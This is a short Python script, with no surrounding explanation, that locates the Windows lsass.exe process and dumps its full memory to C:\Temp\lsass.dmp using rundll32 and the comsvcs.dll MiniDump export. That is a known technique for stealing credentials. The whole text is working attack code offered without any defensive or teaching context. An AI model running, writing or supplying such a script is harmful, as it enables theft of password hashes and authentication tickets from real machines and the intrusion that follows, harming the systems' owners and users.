import subprocess, psutil

lsass_pid = next((p.pid for p in psutil.process_iter() if p.name().lower() == "lsass.exe"), None)
dump_path = r"C:\\Temp\\lsass.dmp"
if lsass_pid:
    cmd = [
        "C:\\Windows\\System32\\rundll32.exe",
        "C:\\Windows\\System32\\comsvcs.dll,MiniDump",
        str(lsass_pid),
        dump_path,
        "full"
    ]
    subprocess.run(cmd, check=True)
    print(f"Dumped LSASS to {dump_path}")
